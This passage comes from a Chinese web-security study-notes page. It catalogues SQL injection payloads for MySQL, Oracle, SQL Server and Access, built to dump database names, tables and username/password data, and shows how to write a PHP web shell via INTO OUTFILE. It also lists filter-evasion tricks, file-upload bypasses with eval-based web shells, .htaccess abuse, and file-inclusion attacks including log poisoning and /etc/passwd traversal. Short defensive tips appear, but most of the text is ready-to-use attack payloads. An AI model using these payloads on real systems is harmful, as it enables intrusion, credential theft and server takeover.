如果报错列数不对，说明是引号闭合，但是列数不对，继续添加数据猜列数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2.库名（任一）</span></span><br><span class="line"><span class="string">username=xixi&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">username=xixi&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;55&#x27;</span>,<span class="string">&#x27;66&#x27;</span>)#</span><br><span class="line"># 第一个语句的最后的单引号是为了闭合引号</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>表名</span><br><span class="line">username<span class="operator">=</span> <span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or &#x27;</span></span><br><span class="line"># 修改substr的第二个参数获得不同表名</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>列名</span><br><span class="line">username<span class="operator">=</span> <span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),1,31),0x7e),1) or &#x27;</span></span><br><span class="line"># 修改substr的第二个参数获得不同列名</span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span>数据</span><br><span class="line">username<span class="operator">=</span> <span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;</span>;<span class="string">&#x27;,password)) from users),1,31),0x7e),1) or &#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>Update</p><blockquote><p>同理于Insert：<code>UPDATE table_name SET col_name = new_value WHERE col_name = value</code></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>猜闭合</span><br><span class="line">sex<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"># 一个单引号报错两个不报错则为单引号闭合</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>库名</span><br><span class="line">sex<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 3.表名</span></span><br><span class="line"><span class="string">sex=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>列名</span><br><span class="line">sex<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),1,31),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 5.数据</span></span><br><span class="line"><span class="string">sex=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(concat(username,<span class="string">&#x27;^&#x27;</span>,password)) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure></li><li><p>Delete</p><blockquote><p>同理于Insert：<code>DELETE FROM table_name WHERE col_name = value</code></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>库名</span><br><span class="line">id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>表名</span><br><span class="line">id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>列名</span><br><span class="line">id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>数据</span><br><span class="line">id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(concat(username,<span class="string">&#x27;^&#x27;</span>,password)) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-Oracle注入"><a href="#3-Oracle注入" class="headerlink" title="3 Oracle注入"></a>3 Oracle注入</h3><ul><li><p>数据库</p><ul><li><p>数据字典存在 SYSTEM 与 SYSAUX 表空间内的若干段中。</p></li><li><p>数据表</p><p><code>select table_name , tablespace_name from user_tables</code></p></li><li><p>表列</p><p><code>select table_name , column_name from user_tab_columns</code></p></li><li><p>dual表</p><p><code>select SYS_CONTEXT( &#39;USERENV&#39; , &#39;CURRENT_USER&#39; ) from dual</code> （属于 sys 模式，所有用户均可访问）</p></li></ul></li><li><p>联合注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、注入点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"># <span class="number">2</span>、列数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line"># <span class="number">3</span>、报错点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual</span><br><span class="line"># <span class="number">4</span>、当前数据库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,SYS_CONTEXT( <span class="string">&#x27;USERENV&#x27;</span> , <span class="string">&#x27;CURRENT_USER&#x27;</span> ) <span class="keyword">from</span> dual</span><br><span class="line"># <span class="number">5</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,table_name <span class="keyword">from</span> user_tables</span><br><span class="line"># <span class="number">6</span>、列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,column_name <span class="keyword">from</span> user_tab_columns</span><br><span class="line"># <span class="number">7</span>、数据</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;username&quot;,&quot;passwiord&quot; <span class="keyword">from</span> &quot;user&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="number">1</span>、当前用户的信息</span><br><span class="line"><span class="keyword">select</span> SYS_CONTEXT( <span class="string">&#x27;USERENV&#x27;</span> , <span class="string">&#x27;CURRENT_USER&#x27;</span> ) <span class="keyword">from</span> dual </span><br><span class="line"># <span class="number">2</span>、当前用户权限</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_roles</span><br><span class="line"># <span class="number">3</span>、数据库版本</span><br><span class="line"><span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$vsersion <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-SQL-Server注入"><a href="#4-SQL-Server注入" class="headerlink" title="4 SQL Server注入"></a>4 SQL Server注入</h3><ul><li><p>数据库</p><ul><li>sysdatabases：相关数据库信息</li><li>sysobjects：数据库中的对象信息</li><li>syscolumns：列名</li></ul></li><li><p>报错注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="number">1</span>、数据库名：</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> ( <span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sys.databases ) <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> db_name() <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">#<span class="number">2</span>、表名</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sec.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>)</span><br><span class="line">#<span class="number">3</span>、列名</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sec.dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sec.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;eims_User&#x27;</span>))</span><br><span class="line">#<span class="number">4</span>、值</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> item1 <span class="keyword">from</span> sec.dbo.eims_User)</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-Access注入"><a href="#5-Access注入" class="headerlink" title="5 Access注入"></a>5 Access注入</h3><ul><li><p>爆破注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、猜表名</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> TableName)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、猜列名</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> ColumnName <span class="keyword">from</span> TableName)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、列数</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">7</span></span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、报错点</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> TableName</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、数据</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,ColumnName,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> TableName</span><br></pre></td></tr></table></figure></li></ul><h3 id="6-复杂注入"><a href="#6-复杂注入" class="headerlink" title="6 复杂注入"></a>6 复杂注入</h3><h4 id="6-1-二次注入"><a href="#6-1-二次注入" class="headerlink" title="6.1 二次注入"></a>6.1 二次注入</h4><blockquote><p>原理：首次注入时因为存在字符转义，无法注入成功，但是该数据会存入数据库中。第二次需要用到数据时，数据会从数据库中取出，由于取出的时候没有做过滤，导致注入代码会成功执行。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 案例</span><br><span class="line">#注册用户界面：</span><br><span class="line">用户名：ctfs<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0)%23  &amp;&amp;  密码：123456  &amp;&amp; 邮箱：ctfs@ctfs.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#找回密码界面ctfs@ctfs.com</span></span><br><span class="line"><span class="string">#数据库做的操作如下，因为用户名被成功存入。</span></span><br><span class="line"><span class="string">select * from users where username = &#x27;</span>ctfs<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0)%23</span></span><br></pre></td></tr></table></figure><h4 id="6-2-堆叠注入"><a href="#6-2-堆叠注入" class="headerlink" title="6.2 堆叠注入"></a>6.2 堆叠注入</h4><blockquote><p><a href="https://www.bbsmax.com/A/B0zqoY7K5v/">堆叠注入</a></p></blockquote><h4 id="6-3-注入后门"><a href="#6-3-注入后门" class="headerlink" title="6.3 注入后门"></a>6.3 注入后门</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span><span class="operator">&lt;</span>?php assert($_POST[a]);?<span class="operator">&gt;</span><span class="string">&#x27; into outfile &#x27;</span>.<span class="operator">/</span>hackable<span class="operator">/</span>uploads<span class="operator">/</span>sh.php<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">0x3c3f7068702061737365727428245f504f53545b615d293b3f3e</span> <span class="keyword">into</span> outfile <span class="string">&#x27;./hackable/uploads/sh.php&#x27;</span>#</span><br></pre></td></tr></table></figure><h3 id="7-sqlmap"><a href="#7-sqlmap" class="headerlink" title="7 sqlmap"></a>7 sqlmap</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a></p></blockquote><h3 id="8-SQL注入绕过"><a href="#8-SQL注入绕过" class="headerlink" title="8 SQL注入绕过"></a>8 SQL注入绕过</h3><h4 id="8-1-空格"><a href="#8-1-空格" class="headerlink" title="8.1 空格"></a>8.1 空格</h4><ol><li>/**/</li><li>制表符：%09</li><li>换行符：%0a</li><li>小括号：(username)</li><li>反引号：`</li></ol><h4 id="8-2-内联注释"><a href="#8-2-内联注释" class="headerlink" title="8.2 内联注释"></a>8.2 内联注释</h4><blockquote><p>原理：MySQL会执行放在 /<em>! … </em>/ 中的语句，当前数据库版本高于语句中的版本则会执行语句，低于则会报错。</p><p>例：<code>/*!50173select*/ * /*!from*/ user ;</code>（50173：5.01.73）</p></blockquote><h4 id="8-3-复写"><a href="#8-3-复写" class="headerlink" title="8.3 复写"></a>8.3 复写</h4><ul><li><p>双写</p><blockquote><p><code>seLeCt</code></p></blockquote></li><li><p>大小写</p><blockquote><p>原理：利用 preg_replace 对指定字符过滤，会将指定字符转化成空（仅一次）</p><p><code>seselectlect</code></p></blockquote></li></ul><h4 id="8-4-编码"><a href="#8-4-编码" class="headerlink" title="8.4 编码"></a>8.4 编码</h4><ol><li>双重 url ：<code>%256c</code>== <code>%6c</code>（%25 是 % 的 url 码）</li><li>十六进制：<code>&#39;users&#39;</code>==<code>0x7573657273 / database()</code> 代替 ‘name’</li><li>Unicode编码：<code>%u006c</code></li><li>ASCII码：<code>CHAR( 100 )</code></li></ol><ul><li>等价字符<ol><li>like 或 in 代替 =</li><li>逗号替换：<code>select substr(database(),1,1)</code> 换成 <code>select substr(database() from 1 for 1)</code></li></ol></li><li>等价函数<ol><li><code>sleep</code> == <code>benchmark</code></li><li><code>ascii</code> == <code>hex，bin</code></li><li><code>group_concat</code> == <code>concat_ws</code></li><li><code>updatexml</code> == <code>extractvalue</code></li><li>字符串截取函数：<code>mid、substr、substring、left、reverse</code></li></ol></li></ul><h3 id="9-SQL加固防护"><a href="#9-SQL加固防护" class="headerlink" title="9 SQL加固防护"></a>9 SQL加固防护</h3><h4 id="9-1-数字型"><a href="#9-1-数字型" class="headerlink" title="9.1 数字型"></a>9.1 数字型</h4><p><code>int intval( mixed $var [ , int $base = 10 ] )</code>：进制转化<br>（base：0（自动检测）、其他为其他进制）</p><h4 id="9-2-字符型"><a href="#9-2-字符型" class="headerlink" title="9.2 字符型"></a>9.2 字符型</h4><ul><li><p>htmlspecialchars( str )</p><blockquote><p>把预定义字符转化成 html 实体（默认不对单引号转化，要加  ENT_QUOTES 参数才会转化</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>字符</th><th>转义</th></tr></thead><tbody><tr><td>&amp;</td><td>&amp;amp</td></tr><tr><td>“</td><td>&amp;quot</td></tr><tr><td>‘</td><td>&amp;#039</td></tr><tr><td>&lt;</td><td>&amp;lt</td></tr><tr><td>&gt;</td><td>&amp;gt</td></tr></tbody></table></div><ul><li><p>mysql_real_escape_string( str )</p><blockquote><p>对 sql 语句中 str 使用的特殊字符进行转义（\0x00、\n、\r、’、”、\x1a）。<br>成功转义返回字符串，否则返回 false。<br>PHP4.3.0以上才可使用，PHP5.3中已经弃用了</p></blockquote></li><li><p>addslashes( str )</p><blockquote><p>预定义字符前加反斜杠，返回字符</p><p>预定义字符：’、”、\、null</p></blockquote></li></ul><h4 id="9-3-参数化查询"><a href="#9-3-参数化查询" class="headerlink" title="9.3 参数化查询"></a>9.3 参数化查询</h4><ul><li>mysqli：( name = ? )</li><li>PDO：( name = : username )</li></ul><h4 id="9-4-服务器配置"><a href="#9-4-服务器配置" class="headerlink" title="9.4 服务器配置"></a>9.4 服务器配置</h4><ul><li><p>magic_quotes_gpc = on</p><blockquote><p>自动转义预定义字符（addslashes函数），自 PHP5.3.0 起废弃并自 PHP5.4.0 移除。</p></blockquote></li><li><p>magic_quotes_sybase = on</p><blockquote><p>单引号会转义成两个单引号。（须开始 magic_quotes_gpc 和 magic_quotes_sybase 才生效）</p></blockquote></li></ul><hr><h2 id="※二、身份认证攻击"><a href="#※二、身份认证攻击" class="headerlink" title="※二、身份认证攻击"></a>※二、身份认证攻击</h2><hr><h2 id="三、文件上传漏洞"><a href="#三、文件上传漏洞" class="headerlink" title="三、文件上传漏洞"></a>三、文件上传漏洞</h2><h3 id="1-文件本身绕过"><a href="#1-文件本身绕过" class="headerlink" title="1 文件本身绕过"></a>1 文件本身绕过</h3><h4 id="1-1-JS过滤绕过"><a href="#1-1-JS过滤绕过" class="headerlink" title="1.1 JS过滤绕过"></a>1.1 JS过滤绕过</h4><ul><li><p>代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allow_ext=<span class="string">&quot;.jpg | .jpeg | .png | .gif | .bmp</span></span><br><span class="line"><span class="string">if (allow_ext.indexOf(ext_name + &quot;</span>|<span class="string">&quot;) == -1 )</span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">    Error!; </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>绕过：</p><ol><li><p>先把木马扩展名改成 .jpg ，再抓包改成 .php</p></li><li><p>修改 js 代码</p></li><li><p>禁用 js 代码</p><blockquote><p>Edge：设置——搜索JavaScript——禁用</p></blockquote></li></ol></li></ul><h4 id="1-2-文件名绕过"><a href="#1-2-文件名绕过" class="headerlink" title="1.2 文件名绕过"></a>1.2 文件名绕过</h4><ul><li><p><code>if($type == &quot;php&quot;)</code>：大小写绕过（phP、PhP、php3、phtml）（双写：phphpp）</p></li><li><p>常见 Content-Type 类型</p></li></ul><div class="table-container"><table><thead><tr><th>值</th><th>格式</th></tr></thead><tbody><tr><td>text/html</td><td>HTML格式</td></tr><tr><td>text/plain</td><td>纯文本格式</td></tr><tr><td>text/xml</td><td>XML格式</td></tr><tr><td>image/gif</td><td>gif图片格式</td></tr><tr><td>image/jpeg</td><td>jpg图片格式</td></tr><tr><td>image/png</td><td>png图片格式</td></tr><tr><td>application/xml</td><td>XML数据格式</td></tr><tr><td>application/json</td><td>JSON数据格式</td></tr><tr><td>application/pdf</td><td>pdf格式</td></tr><tr><td>application/msword</td><td>Word文档格式</td></tr><tr><td>application/octet-stream</td><td>二进制流数据（PHP）</td></tr></tbody></table></div><ul><li>常见文件头</li></ul><div class="table-container"><table><thead><tr><th>文件</th><th>文件头</th></tr></thead><tbody><tr><td>JPEG</td><td>0xFFD8FF</td></tr><tr><td>PNG</td><td>0x89504E470D0A1A0A</td></tr><tr><td>GIF</td><td>47 49 46 38 39 61 （或直接在 txt 前加上 GIF89a）</td></tr></tbody></table></div><ul><li><p>木马</p><p><code>GIF89a&lt;?php @eval($_REQUEST[123]); ?&gt;</code>（绕过函数 exif_imagetype）</p></li><li><p>隐藏文件</p><p><code>copy 111.jpg /b + a.txt /a test.php</code>（类型会检测的话再修改类型）</p></li></ul><h4 id="1-3-文件截断上传"><a href="#1-3-文件截断上传" class="headerlink" title="1.3 文件截断上传"></a>1.3 文件截断上传</h4><ol><li><p>PHP &lt; 5.3.4</p></li><li><p>magic_quotes_gpc = off</p></li><li><p>传文件的路径可控</p><blockquote><p>然后在上传的文件前改一个字符为%00，后面的 php 文件就不会被处理。</p><p>例：<code>https://xxx.com/upload/?filename=test.php%00.txt</code></p></blockquote></li></ol><h3 id="2-其他文件绕过"><a href="#2-其他文件绕过" class="headerlink" title="2 其他文件绕过"></a>2 其他文件绕过</h3><h4 id="2-1-htaccess文件上传"><a href="#2-1-htaccess文件上传" class="headerlink" title="2.1 .htaccess文件上传"></a>2.1 .htaccess文件上传</h4><blockquote><p>原理：.htaccess文件是Web服务器的一个配置文件，可以配置文件的解析方式、重定向等配置。</p></blockquote><ul><li><p>开启配置</p><ol><li>Options FollowSymLinks AllowOverride None 改 All</li><li>LoadModule rewrite_module modules/mod_rewrite.so（去掉注释，开启 rewrite 模块）</li></ol></li><li><p>文件配置</p><ol><li><p>指定文件名</p><p><code>&lt;Files test.jpg&gt;ForceType application/x-httpd-php SetHandler application/x-httpd-php&lt;/Files&gt;</code></p></li><li><p>指定文件后缀</p><p><code>AddType application/x-httpd-php .jpg</code></p></li></ol></li><li><p>利用流程</p><ol><li>构造 .htaccess 文件：内容是文件配置（在windows上无法直接创建，因为无文件名。可以先创建一个有文件名的文件，之后抓包删去）</li><li>构造图片木马文件：copy .jpg /b + .txt .jpg</li><li>上传 .htaccess 和木马文件完成攻击。</li></ol></li></ul><h4 id="2-2-user-ini"><a href="#2-2-user-ini" class="headerlink" title="2.2 .user.ini"></a>2.2 .user.ini</h4><blockquote><p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html">.user.ini</a></p><p>同理 .htaccess</p><p>自动包含jpg到同目录下的php中：auto_prepend_file=flag.jpg</p></blockquote><h4 id="2-3-竞争条件上传"><a href="#2-3-竞争条件上传" class="headerlink" title="2.3 竞争条件上传"></a>2.3 竞争条件上传</h4><blockquote><p>原理：在上传的文件未被消灭之前进行访问，从而生成新的文件存在文件夹中。之后访问新的文件夹便可进行漏洞利用。</p><p>木马：<code>&lt;?php fputs(fopen(&quot;shell.php&quot; , &quot;w&quot;) , &quot;&lt;?php @eval($_POST[123]); ? &gt;&quot;)&gt;</code><br>（原理：创建一个 shell.php 文件，内容为后面的字符串）</p><p>攻击：BP——Intruder——Sniper——Payloads——Null payloads &amp;&amp; Generate:10000（抓两个包，一个上传文件，一个访问文件，和服务器竞争）</p></blockquote><h3 id="3-字符绕过"><a href="#3-字符绕过" class="headerlink" title="3 字符绕过"></a>3 字符绕过</h3><h4 id="3-1-短标签绕过"><a href="#3-1-短标签绕过" class="headerlink" title="3.1 短标签绕过"></a>3.1 短标签绕过</h4><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-415762.html">短标签绕过原理</a></p><p>“&lt;?=”是PHP的一个短的开放式标签，是echo() 的快捷用法。</p><p>PHP.ini——short_open_tag=On。（但是，从PHP版本5.4.0开始，无论PHP.ini文件中的设置如何，都可以使用短标签。）</p><p>例：<code>&lt;?=eval($_POST[&#39;cmd&#39;]; ?)&gt;</code></p></blockquote><h3 id="4-防护"><a href="#4-防护" class="headerlink" title="4 防护"></a>4 防护</h3><ol><li>使用白名单限制文件上传的类型。</li><li>对上传文件进行随机重命名，并且文件的扩展名不允许用户自定义。</li><li>对保存上传的文件的文件夹进行权限限制，去掉脚本的执行权限。（让上传的文件不可以被执行）</li><li>对文件的内容进行恶意代码检测。</li></ol><hr><h2 id="※四、文件下载漏洞"><a href="#※四、文件下载漏洞" class="headerlink" title="※四、文件下载漏洞"></a>※四、文件下载漏洞</h2><hr><h2 id="五、文件包含漏洞"><a href="#五、文件包含漏洞" class="headerlink" title="五、文件包含漏洞"></a>五、文件包含漏洞</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote><p>文件包含函数的参数没有经过过滤或者严格的定义，并且参数可以被用户控制，这样就可以包含非预期的文件。</p><p>include / include_once / require / require_once</p></blockquote><ul><li><p>特征</p><ul><li>?page=a.php</li><li>?home=b.html</li><li>?file=content</li></ul></li><li><p>路径</p><ul><li>Windows：<ul><li>c:\boot.ini【系统版本信息】</li><li>c:\xxx\php.ini【PHP配置信息】</li><li>c:\xxx\my.ini【MySQL配置信息】</li><li>c:\xxx\httpd.conf【Apache配置信息】</li></ul></li><li>Linux：<ul><li>/etc/passwd【Linux系统账号信息】</li><li>/etc/httpd/conf/httpd.conf【Apache配置信息】</li><li>/etc/my.conf【MySQL配置信息】</li><li>/usr/etc/php.ini【PHP配置信息】</li></ul></li></ul></li></ul><h3 id="2-本地包含"><a href="#2-本地包含" class="headerlink" title="2 本地包含"></a>2 本地包含</h3><ul><li><p>无限制</p><blockquote><p><code>?filename=../../../../../../../../../../../../etc/passwd</code></p></blockquote></li><li><p>有限制</p><ol><li><p>%00截断（截断后面的扩展名）</p><blockquote><p>条件：magic_quotes_gpc=off，V（PHP）&lt; 5.3.4</p></blockquote></li><li><p>路径长度截断</p><blockquote><p>Windows路径最长 256B，Linux 4096B（限 32 位）</p><p><code>?filename=test.txt./././././</code> * 256B （截断）</p></blockquote></li><li><p>点号截断</p><blockquote><p>同理 2</p><p><code>?fliename=test.txt.................</code></p></blockquote></li></ol></li></ul><h3 id="3-系统文件包含"><a href="#3-系统文件包含" class="headerlink" title="3 系统文件包含"></a>3 系统文件包含</h3><ul><li><p>Session文件<br>Linux：/var/lib/php/session（服务器存 session 格式：sess_id）</p><ol><li><code>?filename=&lt;?php phpinfo(); ?&gt;</code>（要编码）</li><li>利用 F12 找到 session 值</li><li>?filename=/var/lib/php/sess_id（访问成功表示成功）</li></ol></li><li><p>日志文件</p><ul><li><p>中间件日志</p><blockquote><p>条件是已知路径，且有可读权限。（ CentOS 的 Apache 日志在 /var/log/httpd，默认名 access_log ）</p><p><code>&lt;?php @eval($_POST[123])?&gt;</code>：抓包改编码（URL编码导致无法使用）</p><p>访问路径，key 是 123</p></blockquote></li><li><p>SSH日志：</p><blockquote><p>路径已知，可读。（ /var/log/auth.log ）</p><p><code>ssh &quot;&lt;?php @eval($_POST[123])?&gt;&quot;@ip</code></p><p>访问，key 是 123</p></blockquote></li></ul></li><li><p>远程文件</p><ul><li><p>原理</p><blockquote><p>包含其他服务器的文件（是其他服务器的执行结果发给新服务器）</p></blockquote></li><li><p>条件：allow_url_fopen = on 和 allow_url_include = on</p><p><code>?filename=http://ip/php.txt</code></p></li><li><p>绕过（截断后面的扩展名）</p><ol><li>问号，php.txt?</li><li>井号，php.txt%23</li><li>空格，php.txt%20</li></ol></li></ul></li></ul><h3 id="4-PHP常用伪协议"><a href="#4-PHP常用伪协议" class="headerlink" title="4 PHP常用伪协议"></a>4 PHP常用伪协议</h3><h4 id="4-1-filter"><a href="#4-1-filter" class="headerlink" title="4.1 filter"></a>4.1 filter</h4><blockquote><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter</a></p><p><a href="https://www.cnblogs.com/niyani/p/16954041.html">绕过</a>     <a href="https://www.coder.work/article/156675">iconv编码列表</a></p></blockquote><ul><li><p>作用</p><blockquote><p>访问本地文件系统。（无条件）</p><p>[read=] / 